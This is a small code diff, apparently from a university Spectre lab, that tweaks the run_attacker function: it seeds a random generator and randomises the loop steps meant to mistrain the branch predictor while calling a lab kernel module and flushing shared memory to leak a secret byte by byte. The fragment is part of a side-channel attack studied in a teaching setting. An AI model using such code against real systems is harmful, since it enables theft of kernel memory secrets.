@@ -58,6 +58,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
 
+    srand(time(0));
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
@@ -66,7 +67,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         {
             char leaked_byte;
             int min = 100000;
-            for (size_t i = 0; i < 10000 ; i++) //fool BP -in part 2.4 we need to change max(i) //rand max i?
+            for (size_t i = 0; i < 100000 ; i = i + 1 + rand()%3) //fool BP -in part 2.4 we need to change max(i) //rand max i?
             { 
                 clean_shared_memory_from_tlb(shared_memory);
                 call_kernel_part3(kernel_fd, shared_memory, rand() % 2);
